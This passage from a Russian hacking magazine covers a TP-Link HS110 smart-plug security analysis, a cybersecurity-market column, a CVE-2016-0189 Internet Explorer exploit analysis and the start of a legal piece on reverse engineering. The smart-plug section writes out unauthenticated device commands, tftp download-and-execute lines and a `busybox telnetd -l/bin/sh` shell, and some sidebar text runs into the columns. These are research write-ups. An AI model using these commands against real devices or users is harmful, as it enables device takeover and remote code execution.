ские свойства лучше, чем в стандартном XOR-шифровании с помощью повторя-
ющегося ключа, он все равно может быть легко взломан известными атаками.
   Теперь, когда мы знаем алгоритм и ключ, мы можем сделать Wireshark-дис-
сектор на Lua, который автоматически дешифрует TP-Link Smart Home паке-
ты на 9999-й порт. Сам протокол устройства использует JSON, так что мож-
но добавить и диссектор для него. В итоге мы можем читать данные между
Kasa-приложением и умной розеткой в Wi-Fi-сети.





              Реализованный Wireshark-диссектор для протокола TP-Link Smart Home


Команды для умной розетки сгруппированы в следующие категории:
•  system;
•   netif (WLAN interface commands);
•  cnCloud (соединение с облаком);
•  time;
•  emeter (измерение энергии);
•  schedule (расписание вкл./выкл.);
•  count_down (таймер вкл./выкл.);
•  anti_theft (рандомное расписание вкл./выкл.).

АНАЛИЗ КОМАНД ПРОТОКОЛА TP-LINK SMART HOME
Авторы опубликовали полный список (txt) JSON-команд и Python-клиент для их
отправки.

Системные команды:
Получить информацию о системе:

{"system":{"get_sysinfo":{}}}

Через написанный Python-клиент это будет так:

./tplink-smartplug.py –t 192.168.0.1 –c info

Или можно отправлять свои JSON-команды:

./tplink-smartplug.py –t 192.168.0.1
    –j '{"system":{"get_sysinfo":{}}}'





                       Результат выполнения команды get_sysinfo в TP-Link HS110 Wi-Fi


Чтобы включить или выключить, используется команда set_relay_state
со значением 1 и 0 соответственно:

{"system":{"set_relay_state":{"state":1}}}

Перезагрузка через определенное время:

{"system":{"reboot":{"delay":1}}}

Сброс настроек до заводских и превращение в точку доступа:

{"system":{"reset":{"delay":1}}}

А если вспомнить, что у устройства нет аутентификации в сети, то получается,
что любой пользователь Wi-Fi-сети может выполнить все указанные команды.
Напомню про ссылку выше, по ней полный список команд ;-).
  Из интересного стоит еще отметить команду установки прошивки. Загру-
жается она с произвольного URL-адреса:

{"system":{"download_firmware":{"url":"http://..."}}}

Состояние загрузки можно получить через команду get_download_state:

{"system":{"get_download_state":{}}}

А для установки используется flash_firmware:

{"system":{"flash_firmware":{}}}

Просто так установить модифицированный образ не получится, поскольку он
должен быть подписан одним из четырех захардкоженных RSA-ключей:





                     Захардкоженные RSA-ключи для прошивки TP-Link HS110 Wi-Fi


Wi-Fi-команды
Умную розетку можно еще использовать для сканирования ближайших точек
доступа:

{"netif":{"get_scaninfo":{"refresh":1}}}

Эта команда вернет полный список.
Подключиться к нужной точке доступа с необходимыми параметрами:

{"netif":{"set_stainfo":{"ssid":"WiFi","password":"123",
    "key_type":3}}}

Напомню, что все JSON-команды можно выполнять вне зависимости от со-
стояния устройства. То есть в обычное время подключение к нужной сети тре-
буется только для несконфигурированного состояния — когда умная розетка
в режиме точки доступа.

Облачные команды
Умная розетка постоянно пытается соединиться с сервером TP-Link по адресу
devs.tplinkcloud.com:50443, используя TLS. Это поведение сохраняется,
даже если в Kasa установлена настройка работать только локально. Но мы мо-
жем изменить адрес сервера на нужный нам следующей командой:

{"cnCloud":{"set_server_url":{"server":"devs.tplinkcloud.com"}}}

Только  не  забудь,  что  там  должен  быть  действительный  сертификат
от Symantec EV Root CA.
   Далее можно зарегистрировать устройство в облаке:

{"cnCloud":{"bind":{"username":alice@home.com, "password":"secret"}}}

И отвязать:

{"cnCloud":{"unbind":null}}

С помощью этих команд атакующий может отвязать устройство и изменить
владельца. Еще он может перехватить регистрационные данные, отправляе-
мые Kasa-приложением.

Ищем устройства TP-Link через Device Debug Protocol

TP-Link Device Debug Protocol — запатентованный в Китае протокол TP-Link,
в котором описывается, как устроены TDDP-пакеты. Этот протокол использует-
ся для пинга и поиска устройств TP-Link в сети посредством широковещатель-
ных сообщений, чтения и установки опций и выполнения специальных команд.
Целостность TDDP поддерживается с помощью MD5, встроенного в заголовок
каждого пакета:


                                                                     Структура
                                                                TDDP-пакета





Полезная нагрузка пакета также шифруется с помощью DES. Это означает,
что любые читаемые или записанные настройки будут зашифрованы. DES-
ключ устанавливается как половина (16 шестнадцатеричных чисел, или 8 байт)
MD5-хеша от конкатенации имени пользователя и пароля устройства:

md5(username + password)[:16]

Так как HS110 не поддерживает какую-либо аутентификацию, то имя пользо-
вателя и пароль были захардкожены в shd-файл:


                                                           Захардкоженные
                                                         имя
                                                              пользователя
                                                           и пароль
                                                                 устройства
                                                           для создания
                                                         DES-ключа





Для остальных устройств TP-Link можно проверить эти же данные или прове-
сти брутфорс-атаку по логину. С помощью одного UDP-пакета авторы смог-
ли получить некоторую информацию об устройстве. Для воспроизведения не-
скольких интересных случаев было написано несколько скриптов («тестовая»
строка, deviceID и hardwareID):





                                                 Примеры TDDP-запросов



ТЕСТОВЫЙ РЕЖИМ
После дальнейшего анализа авторы нашли скрытый тестовый режим. Его вид-
но в параметрах командной строки shd-файла:





                                                     Параметры запуска shd

Этот параметр запускает функцию wlan_start_art, ко-
торая, в свою очередь, запускает Atheros Radio Test
(ART) для тестирования производительности Wi-Fi-адап-
теров Atheros.
   Функция wlan_start_art выполняет следующие ко-
манды:
                                                        INFO
LD_LIBRARY_PATH=/tmp
                                                                          Этот кусок отладочногоarping –I br0 –c 1 192.168.0.100
                                                                            кода уже всплывал
tftp –g 192.168.0.100 –r ap_bin/ap121/art.ko                                                                         ранее в уязвимости
    –l /tmp/art.ko                                                 роутеров TP-Link в 2013
insmod /tmp/art.ko                                                        году, которую можно
                                                                     было стриггеритьtftp –g 192.168.0.100 –r ap_bin/ap121/nart.out                                                                            с помощью скрытого
    –l /tmp/nart.out                                             адреса на web-сервере
chmod +x /tmp/nart.out                                                    TP-Link http/tftp
                                                                                       backdoor./tmp/nart.out –instance 0 &

Эти команды соединяются с FTP-сервером, скачивают файл nart.out, делают
его исполняемым и запускают. Для успешной эксплуатации достаточно сде-
лать shell-скрипт с таким именем и расположить по нужному адресу. Достаточ-
но даже будет запустить демон telnetd:

/bin/busybox telnetd –l/bin/sh &

Кстати, запуск этого режима возможно сделать удаленно. Для этого есть
JSON-команда set_test_mode:

./tplink-smarthome.py -t 192.168.0.1
    -j '{"system":{"set_test_mode":{"enable":1}}}'

В память устройства будет установлен специальный флаг, который проверяет-
ся в процессе загрузки. Поэтому нужно перезагрузить устройство:

./tplink-smarthome.py -t 192.168.0.1 -c reboot

После этого устройство попытает-
ся соединиться с сетью hs_test
и паролем 12345670.
   Для установки точки доступа hs_
test авторы использовали hostapd
со следующим конфигурационным
файлом hostapd.conf:

interface=wlan0
driver=nl80211
ssid=hs_test
wpa=2
wpa_passphrase=12345670
channel=1

Увы, но здесь разработчики под-
суетились. Поведение в тестовом
режиме не отличается от стандарт-
ного. Хотя в коде и есть обраще-
ние к wlan_start_art, но загрузки
и исполнения скрипта не происхо-
дит. Возможно, эти строки были за-
комментированы.
                                               Данные для «тестовой» сети
ВЫВОДЫ
Как видишь по этому небольшому
райтапу, безопасность умных устройств пока еще находится в зачаточном со-
стоянии. Никаких сложных техник защиты в массовых клиентских устройствах
не применяется, да и простая аутентификация используется далеко не всег-
да. Конечно, со временем эта область прогрессирует, как это было с вебом,
но пока у независимых исследователей есть отличная возможность прокачать
скиллы на несложных кейсах, а заодно сделать мир вокруг себя чуточку безо-
паснее.

          WWW

                   В рамках этого исследования был написан плагин для Wireshark (под пропри-
                      етарный протокол) и несколько Python-скриптов для проведения атаки. Все
                        это авторы опубликовали в своем GitHub-репозитории. Контакты авторов
                     и более подробную информацию про это устройство ты можешь узнать здесь.
ВЗЛОМ: Колонка Александра Полякова





                                                                                                     @sh2kerrРЫНОК
КИБЕРБЕЗОПАСНОСТИ:
     РАЗНОВИДНОСТИ
     ПРОДУКТОВ43





Если ты еще не успел забыть мою предыдущую ко-
лонку о рынке кибербезопасности и компаниях, ко-
торые его образуют, то спешу тебя порадовать —
сейчас мы продолжим с того места, где прервались
в прошлый раз. Итак, у нас есть «пирог» размером
75 миллиардов долларов, которые получает вся инду-
стрия. Из них 25–30 миллиардов приходится на про-
дукты. Кто делит эти деньги и как? Вопрос не такой уж
сложный. Давай поделим по регионам и типам про-
дуктов, и все узнаем.

Делить по регионам, на самом деле, скучнее всего. Половина денег прихо-
дится на Америку, половина оставшегося — на Европу. Далее с долями, со-
кращающимися примерно вдвое каждый раз, идут Азия, Латинская Америка
и Япония; что-то уже совсем малосущественное перепадает Африке. Вот и вся
математика. Считай, мы с тобой сейчас сэкономили пару десятков тысяч дол-
ларов на консультантах!
  Еще можно было бы поделить по индустриям, к которым относятся компа-
нии-заказчики, но это, мне кажется, совсем не интересно. Так что переходим
к самому занимательному делению — по категориям продуктов. Если верить
последним исследованиям, то таких категорий сейчас насчитывается порядка
восьмидесяти. На мой взгляд, это близко к правде, но на практике встречает-
ся скорее штук двадцать. Еще двадцать — это пока что только модные темы
для разговоров. Пока неясно, какие из обсуждаемых продуктов образуют но-
вые классы, а какие сольются с существующими.

ДЕЛИМ ПИРОГ
Не секрет, что основная доля рынка приходится на файерволлы. Их рынок со-
ставляет порядка 10 миллиардов долларов в год, то есть, считай, добрую треть.
Однако он уже так хорошо поделен между вендорами, что влезть в него практи-
чески невозможно. Следом за файерволлами идет длинный список более мел-
ких рынков.





                                              Наиболее крупные рынки про-
                                                  дуктов ИБ, млрд долларов


На самом деле, на этом практически можно закончить список лидирующих обла-
стей, так как дальше идут относительно небольшие категории с рынком в 100–
500 миллионов долларов в год. Сюда входит и всеми известные средства ска-
нирования уязвимостей — о них мы, кстати, поговорим в следующий раз.

Будущее рынка ИБ: от запчастей к автомобилям

Рынок кибербезопасности крайне диверсифицирован, в отличие от, скажем,
производства автомобилей. В автопроме есть костяк лидеров и больше прак-
тически никого. В кибербезопасности лидеры тоже есть, но они лидируют по-
тому, что делят между собой несколько крупнейших областей. В аналогии с ав-
томобилестроением это были бы предприятия, которые производят двигатели,
кузова и начинку. Кто-то может возразить, что такие фирмы и правда существу-
ют, но фишка в том, что на рынке кибербезопасности пока что нет компаний,
производящих машины целиком!
   Нет таких вендоров, которые могли бы внедрить в компании только свои
продукты и покрыть ими все ключевые потребности, связанные с безопасно-
стью. Как ни крути, но придется обращаться к двум-трем поставщикам.
  Возьмем любого крупного антивирусного вендора. Он предоставляет за-
щиту рабочих станций и периметра, быть может, средства защиты почты,
но на этом и все. А еще нужно будет купить межсетевые экраны и файерволлы
у второго вендора, а также системы мониторинга, сканирования, сбора и ана-
лиза событий. Не помешают и пара каких-нибудь изощренных новинок. Вот
и выходит, что «машину» мы собираем сами из подручных материалов.
   Это признак того, что рынок еще не сформирован, хоть и вырос уже в сто
раз за последние десять лет. Я считаю, что в определенный момент обяза-
тельно появятся пять-десять компаний, которые будут продавать именно
«машины» — то есть всю безопасность под ключ. При этом, конечно, никуда
не денутся десятки фирм, которые продают «комплектующие» и еще сотни, за-
нимающиеся в нашей автомобильной аналогии небольшим тюнингом и аксес-
суарами.



ИЗУЧАЕМ РЫНОК
Теперь давай посмотрим, как между собой делят рынок продукты. Первым де-
лом я предлагаю отбросить Endpoint Protection, то есть антивирусы. Они, как мне
кажется, давно перешли в ответственность IT-департаментов вместе с систе-
мами резервного копирования и прочими элементами Business Continuity.
   Оставшиеся продукты отлично описываются моделью PPDR — то есть
Predict, Prevent, Detect, Respond (предсказывай, предотвращай, детектируй, от-
вечай). Сюда можно добавить мониторинг и аналитику, так что выходит, что гло-
бальных категорий средств защиты всего пять. Мы пройдемся по каждой из них.
   Отмечу, что некоторые продукты, особенно продукты больших вендоров,
могут выступать сразу в нескольких категориях. Но обычно такие комбайны
состоят из модулей, часть которых когда-то вообще существовала в виде от-
дельных решений. Их покупают вместе с небольшими компаниями-разработ-
чиками и добавляют к флагманскому продукту в качестве новой составной ча-
сти. Определиться с классификацией отдельных модулей значительно проще.
   Надеюсь, описание существующих областей рынка еще будет актуально
ко времени выхода этой статьи — меняется тут все настолько стремительно,
что дух захватывает.

Predict
За этим словом скрывается целый класс систем, которые позволяют предска-
зать атаки. Попросту говоря, это гигиена. Будешь мыть руки — не будет бакте-
рий, не будет болезней и не надо будет глотать таблетки. В мире ИБ для «мытья
рук» предлагается много самых разных средств.
•  Penetration Testing Solutions — это решения, которые позволяют провести
   тестирование на проникновение. На данный момент чистых представите-
   лей этого класса, таких как Immunity Canvas или, к примеру, Core Impact,
   почти не осталось. Сейчас все интегрировано в более обширный класс —
    Vulnerability Management.
•  Vulnerability Management — сканеры безопасности для различных областей:
   сетей, приложений, мобильных устройств, устройств ICS и так далее.
• SCM — Security Configuration Management. По сути этот класс уже практиче-
   ски исчез, объединившись с Vulnerability Managenmet.
•  Access Governance — средства анализа контроля доступа и Segregation of
   Duties.
•  SAST — сканеры исходного кода.
•  DAST — средства динамического анализа. Постепенно вымирают и слива-
   ются со средствами статического анализа.
•  IAST — средства интерактивного анализа кода. Сейчас тоже интегрируются
   со средствами статического и динамического анализа.
•  Business Application Security — средства мониторинга безопасности биз-
   нес-приложений типа SAP, Oracle и специфичных систем.
•   TI, Threat Intelligence — системы сбора информации об угрозах и атаках,
   происходящих в мире. Сюда входят платформы по анализу и мониторингу
   фидов, а также сами фиды.
•  Security Awareness Trainings — продукты типа Wombat Security.
•  Anti-Phishing — автоматизированные продукты и платформы по анализу за-
   щищенности к фишинговым атакам, такие как, например, Phish Me.

Prevent
В этой категории у нас средства предотвращения атак. Это, наверное, самый
обширный класс.
•  Firewalls — файерволлы, с ними все понятно.
•  IPS, Intrusion Prevention Systems. Системам обнаружения вторжений, навер-
   ное, лет больше, чем мне. PaloAlto тут самый интересный игрок, как мини-
  мум в плане маркетинга.
•  Encryprion/Masking — шифрование и маскирование. Гигантский, по сути,
   рынок, но очень слабо представленный.
• VPN — виртуальные частные сети. Тоже старая как мир тема.
• WAF — межсетевые экраны уровня веб-приложений. Это уже кое-что поно-
   вее, но рассказывать, думаю, тут нечего. Это, пожалуй, самое первое сред-
   ство защиты, с которым сталкивается пентестер, не считая IDS.
•  Database Firewalls — межсетевые экраны уровня СУБД. Есть и такие. Ког-
   да-то они считались новаторскими, но сейчас это обычное дело.
•  Application Shielding/RASP — защита приложений и новый класс Real Time
   Application Security Protection. Это примерно как файерволл уровня прило-
   жений, только на стероидах. Думаю, посвящу им целую колонку и расскажу,
   в чем отличия от WAF. Вендоры SAST сейчас активно боронят почву в этой
   области.
•  IAM/User Authentication — Identity and Access management, то есть системы
   управления доступом и ролями — например, CyberArk.
• CASB — Cloud Access Security Brokers, системы управления доступом к об-
   лачным сервисам. Примерно как IAM, только в облаках.
•  AntiVirus/Endpoit Protection — средства защиты рабочих станций от вирусов
   и малвари. Разнообразия тут немного, но есть и интересные вещи — к при-
   меру, Cylance.
•  Anti-APT — самая модная и непонятная область — волшебные средства за-
  щиты от неизвестных атак. FireEye — один из ярких примеров.
•  Isolation — всяческие виртуальные песочницы, которые ограничивают до-
   ступ компонентам. Что-то вроде продвинутой версии Citrix. Пример — Menlo
   Security.
• DDOS Mitigation Appliances and Services — хардверные и софтверные сред-
   ства защиты от DDOS.
• EMM — Enterprise Mobility Management. Средства управления безопасно-
   стью мобильных устройств. Даже у SAP есть решение для этого. Скукота.

Detect
Цель средств из этой области — детектировать потенциальные атаки или опас-
ные изменения, руководствуясь тем, что насобирала система. Категория боле-
е-менее новая. В определенный момент стало ясно, что невозможно защититься
от всего и закрыть все уязвимости. С тех пор фокус сместился на системы, кото-
рые позволяют хотя бы обнаружить атаки или просто ненормальное поведение.
•  Log Management — системы сбора и анализа логов. Простых средств сбора
   логов, по сути, уже не осталось — в каждую встроен какой-нибудь супер-
  модный алгоритм анализа корреляций. Но класс, в принципе, пока жив.
•  SIEM — системы сбора и анализа событий безопасности. Кто бы что ни го-
   ворил, а Splunk пока мне видится наиболее удобным средством. Как мини-
  мум потому, что от HP Arcsight у меня сломался мозг.
•  Security Intelligence/Threat Analytics — системы обнаружения потенциальных
   угроз. Это более крутой аналог SEIM — с машинным обучением и кучей до-
   полнительных фишек. Пример — LookingGlass.
•  Flow Visibility — системы мониторинга сетевого или межкомпонентного тра-
   фика. Тема старая, но сейчас она переживает второе рождение.
•  DLP — Data Leakage Prevention, обнаружение утечек информации. Тоже да-
   леко не новая область, но есть интересные компании — к примеру, Digital
   Guardian
• UEBA — за этим не самым благозвучным для русского уха сокращени-
  ем скрывается занятная область — аналитика поведения пользователей.
  Из наиболее перспективных игроков я бы назвал Exabeam и Fortscale.
• EDR — Endpoint Detection and Response, средства для обнаружения атак
   на рабочие станции. Что-то вроде несигнатурных антивирусов. Наиболее
   знамениты сейчас решения Bit9 + CarbonBlack.
•  Fraud/Transaction Monitoring — мониторинг фрода, финансовых транзакций,
   и порчей подозрительной активности.
•  Deception Tools — относительно новая область решений, в которой для об-
   наружения атак используется старая идея ханипотов. Пример — Illusive
   Networks.

Monitor and Analyze
К этому разделу относится мониторинг состояния безопасности всех си-
стем по разным метрикам: анализ рисков, соответствие стандартам и прочее.
По сути, задачи этих систем сводятся к единственной цели — выбрать из всего
многообразия проблем только самые важные.
• GRC — системы управления рисками и стандартами. Наверное, самая об-
   ширная область и самая популярная в этом разделе. Помимо всем извест-
   ного Archer неплох MetricStream.
•  ITRM — IT Risk Management. Менее широкая область, которая тесно пе-
   рекликается с GRC, но с упором на риски в IT. Пример — Brinqua.
•  TVM, Threat And Vulnerability Managemet. Это решения, которые аккумули-
   руют данные из разных сканеров безопасности и систем Therat Intelligece,
   чтобы сопоставлять результаты и узнавать, какие уязвимости необходимо
   закрывать в первую очередь. Пример — Skybox.
•  Security Orchestration — решения, которые помогают интегрировать все су-
  ществующие средства защиты в единую консоль управления. Это довольно
   новая область. Первым был PhantomCyber, но теперь подобных продуктов
   уже около десятка. Один из самых новых называется Komand.
•  Network Security Policy Management/Firewall Management — системы мони-
   торинга состояния всего сетевого оборудования. Пример — Aglosec.
• SOAR — Security Operations, Analytics and Reporting. Это одна из новых
   областей. Ее можно описать как сборную солянку из возможностей ITRM
   и функций для работы с большими массивами данных. Пока, правда, сложно
   сказать, существуют ли продукты, которые полностью удовлетворяют этому
   определению.

Respond
Последнее и самое малоизученное направление — это реагирование на инци-
денты. В конечном счете наша цель — отразить атаку и сделать ее повторение
невозможным. Для этого нужны определенные средства. В какой-то мере эти
решения подобны системам Case Management или ITSM, но есть и нюансы.
•  Incident Management/Response — системы управления инцидентами. На-
   пример, Resillent Systems, недавно купленная компанией IBM.
•  ITSM — системы управления тасками. Пример — BMC.
•  Forensics — решения для расследования инцидентов типа EnCase.

ИТОГО
Вот мы и познакомились с 43 разными классами систем. Немало! Я даже не ду-
мал, что смогу сходу столько вспомнить. Пожалуй, это все достойные внимания
классы решений, которые сейчас есть на рынке. Если что-то забыл — пишите
в комментариях.
   Теперь, когда мы разобрались с общей картиной, можно спускаться ниже
и более подробно изучать каждый из этих классов. Конечно, по всем мы
не пройдемся. Во многих из них я ничегошеньки не понимаю и не собираюсь
делать вид, что это не так. Про другие же, напротив, могу говорить сколько
угодно. Этим в следующий раз и займусь.
ВЗЛОМ
РАЗБОР
ЭКСПЛОИТА:
ПОВРЕЖДЕНИЕ
ПАМЯТИ
В СКРИПТОВОМ
ДВИЖКЕ
WINDOWS





   Борис Рютин,
     Digital Security
   b.ryutin@dsec.ru
    @dukebarman
   dukebarman.pro



Патчи к Windows — замечательный источник пусть и уже
закрытых, но по-прежнему интересных уязвимостей. Мы
разберем патч MS16-051, который латает уязвимость,
приводящую к повреждению памяти в скриптовом движ-
ке. Эксплоит позволяет использовать ее для выполнения
произвольного кода.

 CVSSv2:     Нет
 Дата релиза: 22 июня 2016 года
 Автор:        Theori
 CVE:         CVE-2016-0189

Первым эту тему изучили и описали в своем блоге исследователи из коллекти-
ва Theori. Для анализа использовалась утилита BinDiff, исследовалась библи-
отека vbscript.dll.





                    Сравнение уязвимой и запатченной версий библиотеки vbscript.dll

На скриншоте заметно, что изменения коснулись только нескольких функций.
Наиболее подозрительными выглядят исправления в функции AccessArray().
Проанализируем ее в IDA.





                                      Анализ изменений в функции AccessArray()

Как видишь, в патче добавили блокировку массива перед доступом к нему —
на случай возникновения ошибок. Других изменений в этой функции нет.
   Следующие изменения, связанные с безопасностью, нашлись в функции
IsUnsafeAllowed(). Сравним ее апрельскую и майскую версии.





                                         Псевдокод функции IsUnsafeAllowed()
                                           в версии за апрель





                              Псевдокод функции IsUnsafeAllowed() в версии за май

Снова изменения бросаются в глаза. В прошлой версии IsUnsafeAllowed()
вызывала функцию, которая всегда возвращала ноль без рассмотрения поли-
тик, тогда как исправленная версия вызывает указатель на функцию, располо-
женную в QueryProtectedPolicyPtr. InitializeProtectedPolicy() иници-
ализирует указатель на функцию, используя GetProcAddress.





                                      Псевдокод функции InitializeProtectedPolicy()

Авторы смогли определить две уязвимости, которые были исправлены в этом
патче. Давай теперь посмотрим, как ими воспользоваться для создания экс-
плоита.

EXPLOIT
Первая уязвимость — отсутствие блокировки SafeArray в AccessArray.
В патче добавился код для блокировки массива, а это значит, что атакующий
мог как-то модифицировать массив, что, вероятно, вело к несоответствию не-
которых свойств (к примеру, cDims или cbElements).





Код в основном цикле начинает с крайнего правого измерения индексов мас-
сива и использует их для вычисления указателя на данные. Заметь, что если
тип Variant для индекса — VT_I2 или VT_I4, то значения читаются напрямую
как short и long соответственно. Однако для любого другого типа Variant вы-
зывается rtVariantChangeTypeEx для вычисления индекса. Когда эта функ-
ция получает объект JavaScript, она извлекает значение, вызывая под конец
valueOf для этого объекта. Если предоставить ей объект с методом valueOf,
то это даст возможность выполнять произвольный код на VBScript или
JavaScript внутри rtVariantChangeTypeEx.





Мы можем использовать это для изменения размера массива, в котором на-
ходимся в текущий момент. К примеру, представим, что у нас есть двумерный
массив.


Когда мы получим доступ к массиву, например через A(1,   2), то idx
в AccessArray будет рассчитываться как 1 + (2 * (2 -  0)), что равня-
ется 5. Далее это число умножается на значение cbElements, которое всегда
равно 16 (sizeof(VARIANT)). Результат добавляется к указателю на данные
(pvData), и возвращаются значения по адресу A(1, 2).
  В обычном случае это не ошибка, потому что выделенный буфер равен при-
мерно 16 * 2 * 2001 == 64 032 байта. Тем не менее смещение окажется
вне скоупа, если буфер изменится на меньший. Другими словами, мы можем
получить доступ к A(1, 2), когда массив определен как A(1, 1).
  Наш эксплоит будет перезаписывать память, освободившуюся в результа-
те изменения размера массива. Это позволит нам создать VBScript и Variant
для чтения и записи вне скоупа. Следующий шаг — получение адреса объекта,
чтение памяти по этому адресу и запись в память при помощи многократного
вызова ошибки.
   Теперь рассмотрим вторую уязвимость — обход IsUnsafeAllowed().
  До патча функция IsUnsafeAllowed() всегда возвращала единицу, по-
тому  что COleScript::OnEnterBreakPoint —  это  пустая  функция,  ко-
торая всегда возвращает ноль. В патче это было исправлено. Теперь
QueryProtectedPolicy выполняется должным образом, если доступна в си-
стеме (она есть в версиях Windows 8.1 и выше).
  По умолчанию Internet Explorer предотвращает запуск скриптов, которые
могут навредить системе. Функция InSafeMode() проверяет флаг режима
безопасности (по умолчанию 0xE), а также проводит проверку на небезопас-
ные расширения — такие как Shell.Application. К счастью, мы узнаем, что
IsUnsafeAllowed() всегда возвращает True, то есть мы можем изменить зна-
чение флага с помощью первой уязвимости.





                                               Псевдокод функции InSafeMode()

Однако такой вариант не победит Protected Mode (песочницу) Internet Explorer.
Поэтому мы рассмотрим пример обхода песочницы и запустим код с Medium
Integrity Level.


                           Продолжение статьи
ВЗЛОМ



    Начало статьи
РАЗБОР ЭКСПЛОИТА:
ПОВРЕЖДЕНИЕ ПАМЯТИ
В СКРИПТОВОМ ДВИЖКЕ
WINDOWS



Следующий пример кода вызывает падение Internet Explorer из-за обращения
к памяти, которая больше не доступна. Размер второго массива изменяется
на меньшее значение в процессе доступа к нему.





          Содержимое регистров при падении Internet Explorer после запуска в нем PoC

Произвольные чтение и запись основных элементов — это мощный инстру-
мент эксплуатации. Чтобы код эксплоита было легче читать, авторы обернули
операции в понятные функции:
•  getAddr — вызывает уязвимость и «распыляет» объект, адрес которого мы
   хотим получить, затем ищет адрес в памяти;
•  leakMem — вызывает уязвимость и читает содержимое памяти по указанно-
   му адресу;
•  overwrite — вызывает уязвимость и перезаписывает память по указанному
   адресу с помощью variant CSng(0). Это ведет к нашей цели — получению
  Godmode путем изменения флага на 0x04.

Используя эти операции, мы можем сделать следующее:
•  создать простой экземпляр VBScriptClass;
•  получить адрес экземпляра класса;
•  вытащить адрес CSession из экземпляра класса;
•  вытащить адрес COleScript из экземпляра CSession;
•  перезаписать SafetyOption в COleScript.

Ниже приведен полный эксплоит для получения Godmode в Internet Explorer 11
для Windows 10.





Пример успешной эксплуатации показан на скриншоте.





Может показаться, что дело сделано, но это не так. Многие багхантеры огра-
ничились бы запуском calc.exe, но автор этого эксплоита пошел дальше. Дело
в том, что даже с обходом SafeMode фильтры Protected Mode (песочницы)
определяют, что можно исполнять из процесса Internet Explorer, а что нет.
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet     Explorer\Low
Rights\ElevationPolicy — это группа ключей реестра, которые описыва-
ют политику привилегий. Именно ей следует Protected Mode. Более подроб-
но о Protected Mode и политике ты можешь прочитать в MSDN. Важно то, что
для процесса calc.exe нет установленных правил. Это значит, что будет при-
меняться политика «по умолчанию», а она велит запросить у пользователя раз-
решение перед запуском дочернего процесса с Medium Integrity Level.





                              Сравнение политик у процессов notepad.exe и cmd.exe





                                                        Политика привилегий

Начиная с Windows 8.1 приложение «Калькулятор» относится к классу Modern
и запускается в AppContainer. А вот приложения Wordpad.exe в реестре поли-
тики нет, так что можем проверить эксплоит на нем.





                                     Окно при порождении процесса Wordpad.exe

Процесс Wordpad.exe с Medium Integrity запустится только в том случае, если
пользователь это разрешит.





   Характеристики процесса Wordpad.exe после того, как пользователь разрешил запуск


Описанный эксплоит может выполнять небезопасный VBScript, но если дело
ограничивается запуском notepad.exe с Medium Integrity, то пользы от такой
бреши маловато. Поэтому автор нашел другую лазейку, которая позволяет вы-
полнять произвольный код с нужными правами.
   Несколько лет назад в ZDI зарепортили один баг, кото-
рый в Microsoft посчитали слишком незначительным для того,
чтобы латать. Однако этот трюк позволит нам выполнять про-
извольный код из процесса с Protected Mode.
   Концепт этой идеи описан в блоге ZDI, но если вкратце, то
основная идея следующая. Нужно открыть локальный сервер                                    WWW
из процесса IE с Low Integrity, который будет служить вторым
                                                                            Подробнееэтапом эксплоита.
                                                                            о «боевой» вер-
  По умолчанию политика безопасности Internet Explorer                                                                             сии эксплоита
настроена так, что интранет считается доверенной зоной,      в блоге Fireeye
а localhost — это часть интранета. Таким образом, мы можем
                                                                  Об экспло-проэксплуатировать эту же уязвимость для выполнения кода                                                                                     ит-паках в блоге
или скрипта, но уже с Medium Integrity Level. Ниже представ-      Malware don’t
лен скриншот со схемой эксплуатации из статьи в блоге ZDI.        need Coffee





                                                                            ZDI-14-270


Для демонстрации обхода песочницы авторы эксплоита воспользовались не-
которыми частями этого PoC. Финальный эксплоит для рассмотренной уязви-
мости опубликован на GitHub.





                    Демонстрация успешной эксплуатации уязвимости CVE-2016-0189

После публикации оригинальной статьи эксплоит из нее взяли на вооружение
злоумышленники. Его «боевая» версия, которая работает через Flash, появи-
лась в эксплоит-паках.
 ВЗЛОМ





   Денис Доротенко
     zakon.ru/dorotenko

ПРАВО
НА РЕВЕРС
 КАК ОБРАТНАЯ РАЗРАБОТКА ВЫГЛЯДИТ
 С ЮРИДИЧЕСКОЙ ТОЧКИ ЗРЕНИЯ



 Как российское законодательство относится к обратной
 разработке программ? В каких случаях за такую деятель-
 ность можно понести наказание, а когда реверс-инжини-
 ринг разрешен? Что, если ты не сам реверсишь, а кто-то
 делает это по твоему заказу? Ответы могут разниться
 от случая к случаю, но давай разберемся, на что нужно
 ориентироваться в первую очередь.

 Фанаты Starcraft наверняка помнят те времена, когда можно было играть
 не через Battle.net, а через левый сервер на эмуляторе bnetd (или даже под-
 нять собственный). Игра была той же, но лицензионный ключ не требовался.
 Или вспомнить другой случай: несколько лет назад многие радовались ново-
 сти о том, что простой американский парень Джордж Френсис Хоц — младший
 aka geohot (тот самый, что в прошлом году объявил о создании своего автопи-
 лота для автомобилей) «обул» корпорацию Sony, взломав защиту PlayStation 3.
   Ни Blizzard, ни Sony, ясное дело, не были рады таким публичным пощечи-
 нам и в конечном счете нашли крайних. В первом деле такой оказалась ком-
 пания Internet Gateway, во втором — Джордж и сотоварищи из сообщества
  fail0verflow. В обоих кейсах дело касалось в том числе реверс-инжиниринга
 программного кода.
    К чему мы это вспомнили? К тому, что занятие обратной разработкой соф-
  та без согласия правообладателя кода законно и ненаказуемо только в очень
 редких случаях. Да-да, букве закона (и не только американского, но и нашего)
 знакомо такое явление, как реверс-инжиниринг. Конечно, не настолько хоро-
 шо и детально, как хотелось бы, но и то, что есть, — это намного лучше, чем
  ничего. Но давай-ка начнем с самого начала.

 ОБРАТНАЯ РАЗРАБОТКА И ЗАКОН
  Итак, обратная разработка (обратный инжиниринг, реверс-инжиниринг или,
  кратко, реверсинг; от англ. reverse engineering) — это «исследование некото-
 рого устройства или программы, а также документации на них с целью понять
 принцип его работы и, чаще всего, воспроизвести устройство, программу или
 иной объект с аналогичными функциями, но без копирования как такового».
    Реверс-инжиниринг программного обеспечения — это когда исследо-
 ватель изучает программу с закрытым исходным кодом и, возможно, вносит
 какие-то изменения. В процессе нередко участвует специальный софт: де-
 компиляторы, отладчики, дизассемблеры, распаковщики и прочие хитрые ин-
 струменты. То есть, если упростить, программу неким образом превращают
 в исходный код, чтобы изучить ее структуру и принципы работы.
    Законы, которые ограничивают реверсинг, в каждой стране свои, и их нор-
 мы могут сильно различаться. Давай пройдемся по основным из них.

 США
 •  Закон об авторском праве и положения о добросовестном использовании
    (раздел 17 Свода законов США (U. S. C.) и статья 107 указанного раздела)
 •  Закон о секрете производства
 •  Положения о запрете обхода технических мер защиты Закона об автор-
    ском праве в цифровую эпоху (он же тот самый DMCA) (статья 1201 разде-
    ла 17 Свода законов США)
